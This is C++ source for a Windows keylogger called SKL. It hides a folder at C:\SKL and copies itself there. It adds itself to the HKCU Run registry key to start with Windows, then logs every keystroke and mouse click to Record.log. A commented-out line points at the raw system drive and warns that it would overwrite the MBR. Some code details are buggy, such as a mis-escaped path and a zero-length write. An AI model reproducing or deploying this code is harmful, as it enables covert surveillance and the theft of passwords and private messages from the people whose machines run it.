

#include <windows.h>
#include <iostream>

#define FILE_NAME "C:\\SKL"
#define FILE_EXE "C:\\SKL\\SKL.exe"
#define FILE_LOG "C:\\SKL\\Record.log"
//#define MBR_FILE "\\\\.\\PhysicalDrive0" // Do not use this. It will write over your MBR. Leave it alone unless you know what you are doing.
#define FILE_TEST "C:\\SKL\test.txt"

BOOL FileHidden(LPSTR x); // Makes a file hidden(duh).
BOOL KeyLog(int x); // Basic key logging. It writes to a file in the base C: drive.

int main(void)
{
	//FreeConsole();
	SYSTEMTIME st;
	HKEY hkey;
	long OpenRegKey;
	char filepath[MAX_PATH];
	char MBR[512] = { char(rand()) };
	CreateDirectoryA(FILE_NAME, NULL);
	FileHidden(LPSTR(FILE_NAME));

	GetModuleFileName(NULL, LPSTR(filepath), MAX_PATH);
	CopyFile(LPSTR(filepath), FILE_EXE, FALSE);

	OpenRegKey = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, KEY_ALL_ACCESS, &hkey);
	RegSetValueEx(hkey, "SKL", 0, REG_SZ, (BYTE*)FILE_EXE, strlen(FILE_EXE));
	RegCloseKey(hkey); // Very simple way of adding program to start up. There is probably a better way to do this.

	//GetSystemTime(&st);
	//if (st.wYear == 2019) {
	//	HANDLE mfile = CreateFile(FILE_TEST, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, NULL, NULL); // Reserved for later.
	//}

	KeyLog(1);

	return 0;

}

BOOL FileHidden(LPSTR x)
{
	SetFileAttributesA(x, FILE_ATTRIBUTE_HIDDEN);
	return TRUE;
}

BOOL KeyLog(int x)
{
	HANDLE mfile = CreateFile(LPSTR(FILE_LOG), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD byteswritten;
	LPCSTR test = "";
	int so = 0;
	while (x == 1)
	{
		for (int i = 0; i < 256; i++) // Scans through all the character codes to see if you have pressed one down. If so, it will write to the file in the yecrew folder located on the C: drive.
		{
			if (GetAsyncKeyState(char(*test + i)) == -32767)
			{
				so = char(*test + i);
				switch (so)
				{
				case VK_LBUTTON: {std::cout << "(LM)" << std::endl;
					WriteFile(mfile, "(LM)", 4, &byteswritten, NULL); break; }
				case VK_RBUTTON: {std::cout << "(RM)" << std::endl;
					WriteFile(mfile, "(RM)", 4, &byteswritten, NULL); break; }
				case VK_SPACE: {std::cout << "(SPACE)" << std::endl;
					WriteFile(mfile, " ", 1, &byteswritten, NULL); break; }
				case VK_RETURN: {std::cout << "(ENTER)" << std::endl;
					WriteFile(mfile, "\\n", 3, &byteswritten, NULL); break; }
				case VK_SHIFT: {std::cout << "(SHIFT)";;
					WriteFile(mfile, "(SHIFT)", 7, &byteswritten, NULL); break; }
				case VK_CAPITAL: {std::cout << "(CAP)";;
					WriteFile(mfile, "(CAP)", 5, &byteswritten, NULL); break; }
				case VK_CONTROL: {std::cout << "(CONTROL)";;
					WriteFile(mfile, "(CONTROL)", 0, &byteswritten, NULL); break; }
				case VK_LMENU: {std::cout << "(WINDOWS)";;
					WriteFile(mfile, "(WINDOWS)", 9, &byteswritten, NULL); break; }
				default: {std::cout << LPSTR(LPWSTR(&so));
					WriteFile(mfile, LPSTR(LPWSTR(&so)), sizeof(char), &byteswritten, NULL); }
				}
			}
		}
	}	return TRUE;
}
